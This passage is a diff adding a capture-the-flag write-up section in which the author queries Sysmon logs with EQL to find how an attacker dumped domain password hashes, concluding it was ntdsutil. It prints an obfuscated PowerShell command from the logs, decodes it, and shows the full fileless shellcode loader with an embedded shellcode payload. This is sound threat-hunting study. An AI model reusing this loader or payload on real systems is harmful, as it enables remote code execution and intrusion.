@@ -628,3 +628,99 @@ String: 6     : supatree
 `supatree` is the only user who was identified as a target by DeepBlueCLI: he's the victim.
 
 Given that this objective's difficulty was rated 1/5, I was definitely expecting something more straightforward, and I wouldn't be surprised if there is a much simpler way to identify the victim.
+
+### Windows Log Analysis: Determine Attacker Technique
+
+> Using [these normalized Sysmon logs](https://downloads.elfu.org/sysmon-data.json.zip), identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process. For hints on achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary.
+
+Let's follow the hints given by Mary. We have at our disposal some data captured by sysmon, formatted in JSON. In case you don't know what sysmon is (I did not know), the [first link](https://www.darkoperator.com/blog/2014/8/8/sysinternals-sysmon) given by Mary states that sysmon basically logs:
+
+> * Process Creation with full command line for both current and parent processes. In addition it will record the hash of the process image using either MD5, SHA1 or SHA256. In addition it will record the process GUID when it is created for better correlation since Windows may reuse a process PID.
+> * Network connection from the host to another. It records source process, IP addresses, port numbers, hostnames and port names for TCP/UDP connections.
+> * Changes to the file creation time of a file.
+> * Generates events from early in the boot process to capture activity made by even sophisticated kernel-mode malware.
+
+The first bullet is especially interesting in our case, as it seems that some kind of malware was used to retrieve domain password hashes. A first look at the file shows that is data is pretty well structured (in JSON), and probably too big to be inspected with a simple text editor.
+
+The [second hint given by Mary](https://pen-testing.sans.org/blog/2019/12/10/eql-threat-hunting/) says that EQL is the perfect tool for this job. Its syntax looks super similar to the one of Splunk, for instance. But we don't have a Splunk instance ready for use, so let's give it a try. This [animation](https://asciinema.org/a/dQHwBytDOpemwRQI6gUc95fng) gives a pretty good idea of how to start a shell, load some data and start querying.
+
+{% highlight bash %}
+eql> input ./sysmon-data.json
+Using file ./sysmon-data.json with 2626 events
+
+eql> search process where parent_process_name == "lsass.exe"
+{"command_line": "C:\\Windows\\system32\\cmd.exe", "event_type": "process", "logon_id": 999, "parent_process_name": "lsass.exe", "parent_process_path": "C:\\Windows\\System32\\lsass.exe", "pid": 3440, "ppid": 632, "process_name": "cmd.exe", "process_path": "C:\\Windows\\System32\\cmd.exe", "subtype": "create", "timestamp": 132186398356220000, "unique_pid": "{7431d376-dedb-5dd3-0000-001027be4f00}", "unique_ppid": "{7431d376-cd7f-5dd3-0000-001013920000}", "user": "NT AUTHORITY\\SYSTEM", "user_domain": "NT AUTHORITY", "user_name": "SYSTEM"}
+1 result found
+
+# let's check what this guy did
+eql> search process where logon_id == 999
+...
+2402 results found
+
+# Wow, this "guy" was active! Most of the events look like login attempts with frequently used passwords.
+# Let's not look at these, but at what this guy did with powershell instead.
+eql> search process where logon_id == 999 and command_line == "*powershell*"
+...
+{"command_line": "\"C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAKne010CA7VWbW/aSBD+nEj5D1aFhK0QjANtmkiVbs2bITiBGMxb0Wljr83C2gZ7DZhe//uNAaepmt61J52Vl/XuzOzMM8/M2Il9i9PAF2JdaQhfLs7PujjEniDmaOVDQcjtzYRz6ewMDnKb7W74KHwSxClarWqBh6k/u7urxmFIfH58LzYJR1FEvGdGSSRKwl/CcE5CcvX4vCAWF74IuT+LTRY8Y3YSS6rYmhPhCvl2etYJLJz6UzRWjHIx//lzXppeKbNifR1jFol5I4k48Yo2Y3lJ+CqlF/aTFRHzOrXCIAocXhxSv3xdHPgRdsgDWNsQnfB5YEd5CcKAn5DwOPSFY0CpheO5mIdlNwwsZNshiaJ8QZimtqez2R/i9HTxU+xz6pFiy+ckDFYGCTfUIlFRw77NyBNxZqBl8JD67kySQGwTLImY82PGCsLvmBEfyDaD7VeVxNdKINXloVSAXL4VqB7YMSNH1fwbnqYEkOB5IQGA9/Xi/OLcySjjd25fMwZWZ9PDmoB7YjeI6EHsk1AqCDrcg3kQJvCa64cxkWYv4Aq5Zd2ghZ/rK5kwiHqm/ecA9qZmQO0Z6Jxymks26e7PmVkjDvVJLfGxR62MfOJbKBOHkUOExUzsAXwS86cDYtcIIy7mKWxpsn9Qq3uUv+iqMWU2CZEFmYrAK0ii9L0zx0yI+ZavEw8gOr4D+3IOUJ5k0ieaJ9nt6TsI5asMR1FB6MZQc1ZBMAhmxC4IyI/o6QjFPDgs89/c1WPGqYUjnpmbSUcUT7dVAz/iYWxBziDyvrEiFsUsBaIgaNQmamJQN7s1/yYMVcwYlAFY2kAaYCcN3+ApE0Jw8JB1qWgQ3vJWjHggcyj9BsMuFPqJ7AfqYJfY+e/9y5h8pG2KQwbAK+8guQYLeEEwacihf6SYHgj0325/1TrAj2pITlkQs9KYqglPGZ2zrZSMJ0gOAIQcgm+EgafiiHyoHDuE+E5+pFUEz7jlM91Sl1RBW6q0dPgd0HIrqN3Y9+2FJoe13dxBraila91aT9Mqm7ZhVrhRb/H7bovr9dFiYSDtaTDmkxbS+rS0HFf2qzbdGx1kj3fyh72635bU3X7h2s645jjujWM8Ke8btDOs9tTSNe7U6nFnqG7VUiWq063Wo4Pest3gz2OT4YEjuyPlFtNdJ1yYSqDvWwg152Vr33bM5ly3k7FGyUIudWgP9RC6t54Gg6a7cpsRkm/NddVboHUDI4xaqG4m7fdM7Q0aKhrU1R5+DLrly5qsTOx1vTEZ4bbH7KYmK+MRslEo9925cvM491OcsKuu1VQGdSZJQwaZbgVplWu6n6x7TRfVQcb0AoQbdDm4HIHNhz7oDAeKHSDut0aybLqyixxjPsZIBWl1jRpqUE0+dvWubJrXc+V5qczBZzLafNTb6LJhdWVZvvSe4a+MLH2180fq9mbjakZwj++xuZmUZaW/bTpojS4vVUV95lq93N7AvX35dvDpXcodIE8uqHmvaPGzbq7jMJpjBnSBLp1VZyMIG6e+2w1oqiGKh5G9JKFPGMw7mIgZzRFjgZU2/rRDw8w5ToJ0MA1gWb5+cyUJL4LSt3GQbd3dTcBJKBvbKnaI7/J5obQrl0rQ2ku7Sgki/PWwqsEqEcFQIR0MKShHs+xgVkrrKMe0yej/hepUvXP4Z/8LVN/2/uH0l+ArFQ7h/rD7/cZvgfnbgQ8x5SBpQPth5Dj53oz/xIpXXwZpUiDrzulJP+4eY371AB8MF+d/A60hbvxJCgAA'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))", "event_type": "process", "logon_id": 999, "parent_process_name": "powershell.exe", "parent_process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "pid": 2564, "ppid": 3824, "process_name": "powershell.exe", "process_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe", "subtype": "create", "timestamp": 132186397863620000, "unique_pid": "{7431d376-deaa-5dd3-0000-0010948f4f00}", "unique_ppid": "{7431d376-dea9-5dd3-0000-00108f774f00}", "user": "NT AUTHORITY\\SYSTEM", "user_domain": "NT AUTHORITY", "user_name": "SYSTEM"}
+9 results found
+{% endhighlight %}
+
+This looks nasty. We can see a rather large base64-encoded blob which is decoded (by [System.Convert]::FromBase64String), then decompressed (by System.IO.Compression.GzipStream) and executed as PowerShell script
+Let's have a look at the executed code:
+
+{% highlight bash %}
+echo -n "H4sIAKne010CA7VWbW/aSBD+nEj5D1aFhK0QjANtmkiVbs2bITiBGMxb0Wljr83C2gZ7DZhe//uNAaepmt61J52Vl/XuzOzMM8/M2Il9i9PAF2JdaQhfLs7PujjEniDmaOVDQcjtzYRz6ewMDnKb7W74KHwSxClarWqBh6k/u7urxmFIfH58LzYJR1FEvGdGSSRKwl/CcE5CcvX4vCAWF74IuT+LTRY8Y3YSS6rYmhPhCvl2etYJLJz6UzRWjHIx//lzXppeKbNifR1jFol5I4k48Yo2Y3lJ+CqlF/aTFRHzOrXCIAocXhxSv3xdHPgRdsgDWNsQnfB5YEd5CcKAn5DwOPSFY0CpheO5mIdlNwwsZNshiaJ8QZimtqez2R/i9HTxU+xz6pFiy+ckDFYGCTfUIlFRw77NyBNxZqBl8JD67kySQGwTLImY82PGCsLvmBEfyDaD7VeVxNdKINXloVSAXL4VqB7YMSNH1fwbnqYEkOB5IQGA9/Xi/OLcySjjd25fMwZWZ9PDmoB7YjeI6EHsk1AqCDrcg3kQJvCa64cxkWYv4Aq5Zd2ghZ/rK5kwiHqm/ecA9qZmQO0Z6Jxymks26e7PmVkjDvVJLfGxR62MfOJbKBOHkUOExUzsAXwS86cDYtcIIy7mKWxpsn9Qq3uUv+iqMWU2CZEFmYrAK0ii9L0zx0yI+ZavEw8gOr4D+3IOUJ5k0ieaJ9nt6TsI5asMR1FB6MZQc1ZBMAhmxC4IyI/o6QjFPDgs89/c1WPGqYUjnpmbSUcUT7dVAz/iYWxBziDyvrEiFsUsBaIgaNQmamJQN7s1/yYMVcwYlAFY2kAaYCcN3+ApE0Jw8JB1qWgQ3vJWjHggcyj9BsMuFPqJ7AfqYJfY+e/9y5h8pG2KQwbAK+8guQYLeEEwacihf6SYHgj0325/1TrAj2pITlkQs9KYqglPGZ2zrZSMJ0gOAIQcgm+EgafiiHyoHDuE+E5+pFUEz7jlM91Sl1RBW6q0dPgd0HIrqN3Y9+2FJoe13dxBraila91aT9Mqm7ZhVrhRb/H7bovr9dFiYSDtaTDmkxbS+rS0HFf2qzbdGx1kj3fyh72635bU3X7h2s645jjujWM8Ke8btDOs9tTSNe7U6nFnqG7VUiWq063Wo4Pest3gz2OT4YEjuyPlFtNdJ1yYSqDvWwg152Vr33bM5ly3k7FGyUIudWgP9RC6t54Gg6a7cpsRkm/NddVboHUDI4xaqG4m7fdM7Q0aKhrU1R5+DLrly5qsTOx1vTEZ4bbH7KYmK+MRslEo9925cvM491OcsKuu1VQGdSZJQwaZbgVplWu6n6x7TRfVQcb0AoQbdDm4HIHNhz7oDAeKHSDut0aybLqyixxjPsZIBWl1jRpqUE0+dvWubJrXc+V5qczBZzLafNTb6LJhdWVZvvSe4a+MLH2180fq9mbjakZwj++xuZmUZaW/bTpojS4vVUV95lq93N7AvX35dvDpXcodIE8uqHmvaPGzbq7jMJpjBnSBLp1VZyMIG6e+2w1oqiGKh5G9JKFPGMw7mIgZzRFjgZU2/rRDw8w5ToJ0MA1gWb5+cyUJL4LSt3GQbd3dTcBJKBvbKnaI7/J5obQrl0rQ2ku7Sgki/PWwqsEqEcFQIR0MKShHs+xgVkrrKMe0yej/hepUvXP4Z/8LVN/2/uH0l+ArFQ7h/rD7/cZvgfnbgQ8x5SBpQPth5Dj53oz/xIpXXwZpUiDrzulJP+4eY371AB8MF+d/A60hbvxJCgAA" | base64 -d > script.ps.gz
+gunzip script.ps.gz
+{% endhighlight %}
+
+And here's the result:
+{% highlight powershell %}
+function uM1F {
+  Param ($i46, $zVytt)
+  $vwxWO = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+
+  return $vwxWO.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($vwxWO.GetMethod('GetModuleHandle')).Invoke($null, @($i46)))), $zVytt))
+}
+
+function nL9 {
+  Param (
+    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $kESi,
+    [Parameter(Position = 1)] [Type] $mVd_U = [Void]
+  )
+
+  $yv = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+  $yv.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $kESi).SetImplementationFlags('Runtime, Managed')
+  $yv.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $mVd_U, $kESi).SetImplementationFlags('Runtime, Managed')
+
+  return $yv.CreateType()
+}
+
+[Byte[]]$dc = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqFaAaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=")
+
+$oDm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uM1F kernel32.dll VirtualAlloc), (nL9 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $dc.Length,0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($dc, 0, $oDm, $dc.length)
+
+$lHZX = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uM1F kernel32.dll CreateThread), (nL9 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$oDm,[IntPtr]::Zero,0,[IntPtr]::Zero)
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((uM1F kernel32.dll WaitForSingleObject), (nL9 @([IntPtr], [Int32]))).Invoke($lHZX,0xffffffff) | Out-Null
+{% endhighlight %}
+
+Some minutes spent on Google show that [someone else already encountered this before](https://isc.sans.edu/forums/diary/Fileless+Malicious+PowerShell+Sample/23081/).
+The other suspicious event look fairly similar; they all contain the same PowerShell code, only obfuscated with different variable names.
+This is interesting ... but unfortunately, this does not tell us how the domain password hashes were retrieved by the attacker.
+
+Let's take a step back. To have a high-level view of what this user did, let's look at the different commands used, by looking at the different values of the field `process_name`:
+{% highlight bash %}
+eql> search process where logon_id == 999 | count process_name
+{"count": 1, "key": "ntdsutil.exe", "percent": 0.00041631973355537054}
+{"count": 6, "key": "powershell.exe", "percent": 0.002497918401332223}
+{"count": 7, "key": "cmd.exe", "percent": 0.0029142381348875937}
+{"count": 2388, "key": "net.exe", "percent": 0.9941715237302248}
+4 results found
+{% endhighlight %}
+
+We went straight for the PowerShell events, but the first line above is interesting: [`ntdsutil`](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v%3Dws.11)) is an util that can be used to perform various maintenance activities on Active Directory Domain Services. The [second hint given by Mary](https://pen-testing.sans.org/blog/2019/12/10/eql-threat-hunting/) confirms that this tool can be used to create a backup of a domain password hashes, which can then be exfiltrated. `ntdsutil` is the key of the second challenge!
+
+{% highlight bash %}
+{% endhighlight %}
+
+
